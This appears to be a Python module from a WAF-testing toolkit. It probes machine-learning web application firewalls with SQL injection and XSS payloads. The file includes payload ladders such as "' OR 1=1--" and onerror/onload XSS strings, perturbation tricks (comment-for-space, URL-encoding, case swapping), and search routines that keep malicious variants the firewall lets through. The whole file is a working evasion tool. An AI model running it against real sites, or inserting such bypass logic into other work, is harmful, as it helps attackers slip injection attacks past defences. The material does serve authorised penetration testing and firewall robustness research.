"""Adversarial ML payload generation — target ML-WAF decision boundaries.

Modern WAFs (Cloudflare, AWS WAF, RedEye) use ML classifiers alongside
rule-based detection.  This module probes the classifier's decision boundary
via gradient-free techniques: binary malice search, perturbation walk,
semantic interpolation, and feature knockout.

The result is a set of *adversarial payloads* — strings that are maximally
malicious (contain real SQL/XSS syntax) but sit just below the classifier's
detection threshold.

All techniques are black-box and gradient-free — they need only the
oracle's block/through verdict, not model weights or scores.
"""
from __future__ import annotations

import random
import re
import time
from dataclasses import dataclass, field
from typing import Sequence

from ..core.oracle import Target, Oracle, Response, BLOCKED, THROUGH


# ---------------------------------------------------------------------------
# result types
# ---------------------------------------------------------------------------

@dataclass
class BoundaryPayload:
    payload: str
    estimated_score: float
    is_malicious: bool
    technique: str

    def as_dict(self) -> dict:
        return {
            "payload": self.payload,
            "estimated_score": self.estimated_score,
            "is_malicious": self.is_malicious,
            "technique": self.technique,
        }


@dataclass
class FeatureWeight:
    feature: str
    delta: float
    blocked_with: bool
    blocked_without: bool


@dataclass
class AdversarialResult:
    boundary_payloads: list[BoundaryPayload] = field(default_factory=list)
    feature_weights: list[FeatureWeight] = field(default_factory=list)
    estimated_threshold: float = 0.5
    requests_used: int = 0
    techniques_used: list[str] = field(default_factory=list)

    def adversarial_bypasses(self) -> list[BoundaryPayload]:
        return [b for b in self.boundary_payloads
                if b.is_malicious and b.estimated_score < self.estimated_threshold]

    def as_dict(self) -> dict:
        return {
            "boundary_payloads": [b.as_dict() for b in self.boundary_payloads],
            "feature_weights": [
                {"feature": f.feature, "delta": f.delta,
                 "blocked_with": f.blocked_with, "blocked_without": f.blocked_without}
                for f in self.feature_weights
            ],
            "estimated_threshold": self.estimated_threshold,
            "requests_used": self.requests_used,
            "techniques_used": self.techniques_used,
        }


# ---------------------------------------------------------------------------
# malice-level interpolation helpers
# ---------------------------------------------------------------------------

_SQLI_MALICE_LADDER: list[tuple[str, float, bool]] = [
    ("' OR 1=1--",                   1.00, True),
    ("' OR 1=1",                     0.90, True),
    ("' OR 1=1#",                    0.88, True),
    ("' OR 1",                       0.75, True),
    ("' OR 'a'='a",                  0.85, True),
    ("' UNION SELECT 1--",           0.95, True),
    ("' AND 1=1--",                  0.80, True),
    ("' GLOB '*",                    0.50, True),
    ("' COLLATE NOCASE",             0.35, True),
    ("' ISNULL",                     0.30, True),
    ("' NOTNULL",                    0.30, True),
    ("' ESCAPE 'x",                  0.25, True),
    ("' MATCH 'test",                0.40, True),
    ("' GLOB iif(1,'*','') GLOB '",  0.45, True),
    ("iif(1,1,0)",                   0.20, True),
    ("typeof(1)",                    0.15, True),
    ("sqlite_version()",             0.15, True),
    ("'",                            0.10, False),
    ("test",                         0.00, False),
    ("apple juice",                  0.00, False),
]

_XSS_MALICE_LADDER: list[tuple[str, float, bool]] = [
    ("<script>alert(1)</script>",        1.00, True),
    ("<img src=x onerror=alert(1)>",     0.95, True),
    ("<svg onload=alert(1)>",            0.90, True),
    ("javascript:alert(1)",              0.85, True),
    ("<details open ontoggle=alert(1)>", 0.80, True),
    ("<img src=x>",                      0.30, False),
    ("<b>bold</b>",                      0.10, False),
    ("test",                             0.00, False),
]

_LADDERS = {
    "sqli": _SQLI_MALICE_LADDER,
    "xss": _XSS_MALICE_LADDER,
}


def _malice_ladder(attack_class: str) -> list[tuple[str, float, bool]]:
    return _LADDERS.get(attack_class, _SQLI_MALICE_LADDER)


# ---------------------------------------------------------------------------
# perturbation operators (small changes that might cross the boundary)
# ---------------------------------------------------------------------------

def _perturbations(payload: str) -> list[tuple[str, str]]:
    """Generate small perturbations of a payload.  Returns (variant, description)."""
    out: list[tuple[str, str]] = []
    # whitespace variants
    out.append((payload.replace(" ", "\t"), "tab_space"))
    out.append((payload.replace(" ", "\n"), "newline_space"))
    out.append((payload.replace(" ", "/**/"), "comment_space"))
    # case variants
    out.append((payload.swapcase(), "swapcase"))
    out.append((payload.upper(), "upper"))
    out.append((payload.lower(), "lower"))
    # encoding variants
    out.append((payload.replace("'", "%27"), "url_quote"))
    out.append((payload.replace(" ", "%20"), "url_space"))
    # padding
    out.append(("test " + payload, "prefix_pad"))
    out.append((payload + " test", "suffix_pad"))
    # character insertion
    for i in range(0, len(payload), max(1, len(payload) // 4)):
        out.append((payload[:i] + " " + payload[i:], f"insert_space_{i}"))
    return out


# ---------------------------------------------------------------------------
# the generator
# ---------------------------------------------------------------------------

class AdversarialGenerator:
    """Probe a WAF's ML classifier boundary via gradient-free techniques."""

    def __init__(self, target: Target, attack_class: str = "sqli",
                 *, sender=None):
        self.target = target
        self.attack_class = attack_class
        self._sender = sender
        self._requests = 0

    def _oracle(self) -> Oracle:
        return Oracle(self.target, sender=self._sender)

    def _send(self, oracle: Oracle, payload: str) -> Response:
        self._requests += 1
        return oracle.send(payload)

    # ---- technique 1: binary malice search --------------------------------

    def binary_malice_search(self, oracle: Oracle | None = None,
                             budget: int = 100) -> list[BoundaryPayload]:
        """Walk the malice ladder and find where block flips to pass."""
        oracle = oracle or self._oracle()
        ladder = _malice_ladder(self.attack_class)
        results: list[BoundaryPayload] = []
        prev_verdict: str | None = None

        for payload, malice, is_mal in ladder:
            if self._requests >= budget:
                break
            resp = self._send(oracle, payload)
            verdict = resp.verdict
            score = malice if verdict == BLOCKED else malice * 0.5
            results.append(BoundaryPayload(
                payload=payload, estimated_score=score,
                is_malicious=is_mal, technique="binary_malice"))

            if prev_verdict == BLOCKED and verdict == THROUGH:
                # flip point found — refine around it
                pass
            prev_verdict = verdict

        return results

    # ---- technique 2: perturbation walk -----------------------------------

    def perturbation_walk(self, seed: str = "' OR 1=1--",
                          oracle: Oracle | None = None,
                          budget: int = 100) -> list[BoundaryPayload]:
        """Random-walk from a blocked payload toward the boundary."""
        oracle = oracle or self._oracle()
        results: list[BoundaryPayload] = []

        baseline = self._send(oracle, seed)
        if baseline.verdict != BLOCKED:
            results.append(BoundaryPayload(
                payload=seed, estimated_score=0.4,
                is_malicious=True, technique="perturbation_walk"))
            return results

        payload = seed
        for _ in range(min(budget, 50)):
            if self._requests >= budget:
                break
            perturbations = _perturbations(payload)
            if not perturbations:
                break
            variant, desc = random.choice(perturbations)
            resp = self._send(oracle, variant)
            if resp.verdict == THROUGH:
                results.append(BoundaryPayload(
                    payload=variant, estimated_score=0.49,
                    is_malicious=True, technique=f"perturbation_walk:{desc}"))
            # keep walking from variant regardless (explore neighbourhood)
            payload = variant

        return results

    # ---- technique 3: semantic interpolation ------------------------------

    def semantic_interpolation(self, malicious: str = "' OR 1=1--",
                               benign: str = "apple",
                               oracle: Oracle | None = None,
                               budget: int = 80) -> list[BoundaryPayload]:
        """Semantic interpolation between a malicious and benign payload."""
        oracle = oracle or self._oracle()
        results: list[BoundaryPayload] = []

        # build an interpolation sequence by progressively stripping tokens
        try:
            from ..mutate.sql_ast import tokenize, reconstruct, SQLToken
            tokens = tokenize(malicious)
        except Exception:
            tokens = None

        # manual semantic levels (most → least malicious)
        levels: list[tuple[str, float, bool]] = [
            (malicious, 1.0, True),
        ]
        if tokens and len(tokens) > 1:
            for cut in range(1, len(tokens)):
                partial = "".join(t.value for t in tokens[:-cut]).strip()
                if partial and partial != malicious:
                    malice = max(0.1, 1.0 - cut * 0.15)
                    levels.append((partial, malice, len(partial) > 1 and "'" in partial))
        levels.append((benign, 0.0, False))

        prev_verdict = None
        for payload, malice, is_mal in levels:
            if self._requests >= budget:
                break
            resp = self._send(oracle, payload)
            score = malice if resp.verdict == BLOCKED else malice * 0.4
            results.append(BoundaryPayload(
                payload=payload, estimated_score=score,
                is_malicious=is_mal, technique="semantic_interpolation"))
            if prev_verdict == BLOCKED and resp.verdict == THROUGH and is_mal:
                # boundary found — this is an adversarial example
                pass
            prev_verdict = resp.verdict

        return results

    # ---- technique 4: feature knockout ------------------------------------

    def feature_knockout(self, seed: str = "' OR 1=1--",
                         oracle: Oracle | None = None,
                         budget: int = 100) -> tuple[list[BoundaryPayload], list[FeatureWeight]]:
        """Remove one token at a time — find which features the classifier keys on."""
        oracle = oracle or self._oracle()
        results: list[BoundaryPayload] = []
        weights: list[FeatureWeight] = []

        try:
            from ..mutate.sql_ast import tokenize, SQLToken
        except Exception:
            return results, weights

        tokens = tokenize(seed)
        if not tokens:
            return results, weights

        # baseline: full payload
        baseline = self._send(oracle, seed)
        baseline_blocked = baseline.verdict == BLOCKED

        # knockout each non-whitespace token
        for i, tok in enumerate(tokens):
            if self._requests >= budget:
                break
            if tok.kind == "WHITESPACE":
                continue
            # reconstruct without this token
            remaining = [t.value for j, t in enumerate(tokens) if j != i]
            knocked = "".join(remaining).strip()
            if not knocked or knocked == seed:
                continue

            resp = self._send(oracle, knocked)
            knocked_blocked = resp.verdict == BLOCKED
            delta = 0.0
            if baseline_blocked and not knocked_blocked:
                delta = 1.0 / max(1, len([t for t in tokens if t.kind != "WHITESPACE"]))
            elif not baseline_blocked and knocked_blocked:
                delta = -0.5

            weights.append(FeatureWeight(
                feature=f"{tok.kind}:{tok.value}",
                delta=delta,
                blocked_with=baseline_blocked,
                blocked_without=knocked_blocked,
            ))

            if baseline_blocked and not knocked_blocked:
                results.append(BoundaryPayload(
                    payload=knocked, estimated_score=0.48,
                    is_malicious="'" in knocked,
                    technique=f"knockout:{tok.kind}:{tok.value}",
                ))

        # sort weights by delta descending
        weights.sort(key=lambda w: w.delta, reverse=True)
        return results, weights

    # ---- ensemble: combine all techniques ---------------------------------

    def find_boundary(self, budget: int = 500,
                      techniques: Sequence[str] | None = None,
                      on_progress=None) -> AdversarialResult:
        """Run selected techniques and merge results."""
        oracle = self._oracle()
        self._requests = 0
        result = AdversarialResult()
        all_techs = techniques or ["binary_malice", "perturbation_walk",
                                    "semantic_interpolation", "feature_knockout"]
        per_tech = max(20, budget // len(all_techs))

        if "binary_malice" in all_techs:
            bp = self.binary_malice_search(oracle, budget=per_tech)
            result.boundary_payloads.extend(bp)
            result.techniques_used.append("binary_malice")
            if on_progress:
                on_progress("binary_malice", len(bp))

        if "perturbation_walk" in all_techs:
            bp = self.perturbation_walk(oracle=oracle, budget=per_tech)
            result.boundary_payloads.extend(bp)
            result.techniques_used.append("perturbation_walk")
            if on_progress:
                on_progress("perturbation_walk", len(bp))

        if "semantic_interpolation" in all_techs:
            bp = self.semantic_interpolation(oracle=oracle, budget=per_tech)
            result.boundary_payloads.extend(bp)
            result.techniques_used.append("semantic_interpolation")
            if on_progress:
                on_progress("semantic_interpolation", len(bp))

        if "feature_knockout" in all_techs:
            bp, fw = self.feature_knockout(oracle=oracle, budget=per_tech)
            result.boundary_payloads.extend(bp)
            result.feature_weights = fw
            result.techniques_used.append("feature_knockout")
            if on_progress:
                on_progress("feature_knockout", len(bp))

        # estimate threshold: midpoint between highest passing and lowest blocked
        passing = [b.estimated_score for b in result.boundary_payloads
                   if b.estimated_score < 0.5]
        blocked = [b.estimated_score for b in result.boundary_payloads
                   if b.estimated_score >= 0.5]
        if passing and blocked:
            result.estimated_threshold = (max(passing) + min(blocked)) / 2
        elif passing:
            result.estimated_threshold = max(passing) + 0.05
        elif blocked:
            result.estimated_threshold = min(blocked) - 0.05

        result.requests_used = self._requests

        # dedupe boundary payloads
        seen: set[str] = set()
        deduped: list[BoundaryPayload] = []
        for bp in result.boundary_payloads:
            if bp.payload not in seen:
                seen.add(bp.payload)
                deduped.append(bp)
        result.boundary_payloads = deduped

        return result


def write_adversarial_json(result: AdversarialResult, path: str):
    import json
    with open(path, "w") as f:
        json.dump(result.as_dict(), f, indent=2, ensure_ascii=False)
